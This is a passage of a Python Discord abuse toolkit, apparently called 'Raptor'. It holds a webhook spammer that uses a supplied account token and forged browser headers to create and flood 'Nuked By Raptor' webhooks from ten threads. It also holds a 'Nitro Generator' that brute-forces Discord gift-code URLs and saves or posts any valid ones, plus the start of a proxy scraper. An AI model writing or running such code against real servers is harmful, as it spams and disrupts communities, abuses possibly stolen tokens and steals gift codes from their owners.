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"

            ids = []
            for x in range(1):

                r = requests.post(url,headers=header,json={'name':'Nuked By Raptor'})

                try:
                    ids.append(r.json()['id'])
                except Exception as e:
                    print('')

                length = len(ids)
                for i in range(length):
                    header2 = {
                        "authority": "discord.com",
                        "method": "POST",
                        "path": f"/api/v9/webhooks/{ids[i]}",
                        "scheme": "https",
                        "accept": "*/*",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US",
                        "Authorization": f'{tukan4}',
                        "content-length": "0",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        'referer': 'https://discord.com/channels/@me',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": useragent(),
                        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                    }
                    url1 = f'https://discord.com/api/v9/webhooks/{ids[i]}'
                    t = requests.patch(url1,headers=header2,json={'avatar':url2})

        threads = []

        for x in range(10):
            t = threading.Thread(target=spammer)
            t.daemon = True
            t.start()
            threads.append(t)

        for thread in threads:
            t.join()

        print("Finished! Created 10 webhooks named *Nuked by Raptor* and with avatars named *Raptor*")

    elif options2 in ['6','06']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Webhook Maker + Spammer")

      print(f'''
      {Fore.MAGENTA} __        __   _     _                 _      ____            _                             
       \ \      / /__| |__ | |__   ___   ___ | | __ |  _ \  ___  ___| |_ _ __ ___  _   _  ___ _ __ 
        \ \ /\ / / _ \ '_ \| '_ \ / _ \ / _ \| |/ / | | | |/ _ \/ __| __| '__/ _ \| | | |/ _ \ '__|
      {Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |_| |  __/\__ \ |_| | | (_) | |_| |  __/ |   
          \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\ |____/ \___||___/\__|_|  \___/ \__, |\___|_|   
                                                                                  |___/           
      ''')
      chanid = input("What is the channel id you want to make the webhooks in and spam them?: ")
      msg = input("What message do you want to spam?: ")
      tukan3 = input("What is the token to use?: ")

      print("Starting Now...")

      def spammer():
          url = f'https://discord.com/api/v9/channels/{chanid}/webhooks'

          def randstr(lenn):
              alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
              text = ''
              for i in range(0, lenn):
                  text += alpha[random.randint(0, len(alpha) - 1)]
              return text


          header = {
              "authority": "discord.com",
              "method": "POST",
              "path": f"/api/v9/channels/{chanid}/webhooks",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{tukan3}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
          }




          url2 = "data:image/jpeg;base64,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"

          ids = []
          token = []

          print("Succefully Created 10 Webhooks!")
          for x in range(1):

              r = requests.post(url,headers=header,json={'name':'Nuked By Raptor'})
              try:
                  ids.append(r.json()['id'])
                  token.append(r.json()['token'])
              except Exception as e:
                  print('')

              length = len(ids)
              for i in range(length):
                  header2 = {
                      "authority": "discord.com",
                      "method": "POST",
                      "path": f"/api/v9/webhooks/{ids[i]}",
                      "scheme": "https",
                      "accept": "*/*",
                      "accept-encoding": "gzip, deflate, br",
                      "accept-language": "en-US",
                      "Authorization": f'{tukan3}',
                      "content-length": "0",
                      "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                      "origin": "https://discord.com",
                      'referer': 'https://discord.com/channels/@me',
                      "sec-fetch-dest": "empty",
                      "sec-fetch-mode": "cors",
                      "sec-fetch-site": "same-origin",
                      "user-agent": useragent(),
                      "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                      "x-debug-options": "bugReporterEnabled",
                      "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                  }
                  url1 = f'https://discord.com/api/v9/webhooks/{ids[i]}'
                  t = requests.patch(url1,headers=header2,json={'avatar':url2})
                  print("Succefully changed the avatar to a *Raptor* for the Webhooks!")

                  link = []

                  for t in range(length):
                      url3 = f'https://discord.com/api/webhooks/{ids[t]}/{token[t]}'
                      link.append(url3)

                  for x in range(5):
                      r = requests.post(url3, headers=header, json={'content':msg})
                      if r.status_code == 200 or 204:
                          print(f'Successfully sent {msg} to the chat')

      threads = []
      for x in range(10):
          t = threading.Thread(target=spammer)
          t.daemon = True
          t.start()
          threads.append(t)

      for thread in threads:
          t.join()

    elif options2 in ['7','07']:
      tool()
      return
    else:
      print('Invalid Option')

    while __name__ == '__main__' and options2 not in ['7','07']:
      print(Fore.BLUE)
      os.system('pause')
      webhooks()

  def nitro():
    ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator")
    colorama.init()

    print(Fore.MAGENTA + '  _   _ _ _                ____            ')
    print(' | \ | (_) |_ _ __ ___    / ___| ___ _ __  ')   
    print(" |  \| | | __| '__/ _ \  | |  _ / _ \ '_ \ ")  
    print("\033[31m | |\  | | |_| | | (_) | | |_| |  __/ | | |")
    print(" |_| \_|_|\__|_|  \___/   \____|\___|_| |_|")  
    print("                                           ")  


    threaad = int(input(Fore.RED + "How many threads do you want?: "))
    sendto = str(input("Do you want to send the valid nitro code to a webhook?: ")).lower()


    def nitrotofile(threaad):
        def nitro():
            cls()
            while True:
                nitrochars = string.ascii_letters + string.digits
                code = "".join(random.choice(nitrochars)for x in range(16))
                nitrocode = "https://discord.gift/" + code
                r = requests.get('https://discord.com/api/v9/entitlements/gift-codes/{}'.format(code))
                if r.status_code == 200:
                    print("\033[32m[+] Valid ~ {}".format(nitrocode))
                    file = open("ValidNitro.txt",'a')
                    file.write(nitrocode + '\n')
                else:
                    print("\033[31m[-] Invalid ~ {}".format(nitrocode))

        threads = []

        for _ in range(threaad):
            t = threading.Thread(target=nitro)
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()

    def nitrotohook(threaad):
        webhook = input("What is the webhook do you want the valid nitro code to be sent to?: ")
        def nitro():
            cls()
            while True:
                nitrochars = string.ascii_letters + string.digits
                code = "".join(random.choice(nitrochars)for x in range(16))
                nitrocode = "https://discord.gift/" + code
                r = requests.get('https://discord.com/api/v9/entitlements/gift-codes/{}'.format(code))
                if r.status_code == 200:
                    print("\033[32m[+] Valid ~ {}".format(nitrocode))
                    payload = {
                        'content':nitrocode
                    }
                    requests.post(webhook,json=payload)
                else:
                    print("\033[31m[-] Invalid ~ {}".format(nitrocode))

        threads = []

        for _ in range(threaad):
            t = threading.Thread(target=nitro)
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()

    if sendto in yeslist:
        nitrotohook(threaad)
    elif sendto in nolist:
        nitrotofile(threaad)
    else:
        print('Invalid Option.')

  global proxyscrape
  def proxyscrape():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Proxy Scraper")
    print(Fore.MAGENTA + '''

   ____                        ____                                 
  |  _ \ _ __ _____  ___   _  / ___|  ___ _ __ __ _ _ __   ___ _ __ 
  | |_) | '__/ _ \ \/ / | | | \___ \ / __| '__/ _` | '_ \ / _ \ '__|
  \033[31m|  __/| | | (_) >  <| |_| |  ___) | (__| | | (_| | |_) |  __/ |   
  |_|   |_|  \___/_/\_\\__,  | |____/ \___|_|  \__,_| .__/ \___|_|   
                        |___/                      |_|              
    ''')
    typeproxy = int(input('''
   What proxy do you need?
   [1] Http/Https
   [2] Socks4
   [3] Socks5

   [?>]'''))
    if typeproxy == 1:
      out_file = "Https Proxies.txt"
      proxies = open(out_file,'ab')
